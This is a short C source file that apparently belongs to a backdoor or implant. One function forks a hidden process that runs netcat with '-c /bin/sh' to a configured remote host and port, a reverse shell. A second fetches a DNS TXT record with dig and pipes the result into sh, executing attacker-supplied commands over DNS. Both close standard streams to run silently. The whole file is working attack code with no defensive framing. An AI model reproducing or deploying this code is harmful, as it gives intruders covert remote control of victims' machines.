#include "lib.h"
#include "remote.h"
#include <signal.h>

int	remote(void)
{
	pid_t pid;
	char *const para[] = {"/usr/bin/nohup",
		"/bin/nc", REMOTE_TARGET, REMOTE_PORT, "-c", "/bin/sh", REMOTE_EXEC,
			NULL};
	if ((pid = ft_fork()) == 0)
	{
		ft_close(0);
		ft_close(1);
		ft_close(2);
		ft_execve(para[0], para, NULL);
		ft_exit(0);
	}
	return (pid < -1);
}

int	dns_remote(void)
{
	pid_t pid;
	if ((pid = ft_fork()) == 0)
	{
		ft_signal(SIGCHLD, SIG_IGN);
		ft_close(0);
		ft_close(1);
		ft_close(2);
		char *const para[] = {"/bin/sh", "-c", "dig " REMOTE_DNS_QUERY " TXT +short | tr '\"' ' ' | sh", NULL};
		ft_execve(para[0], para, NULL);
		ft_exit(0);
	}
	return (pid < -1);
}
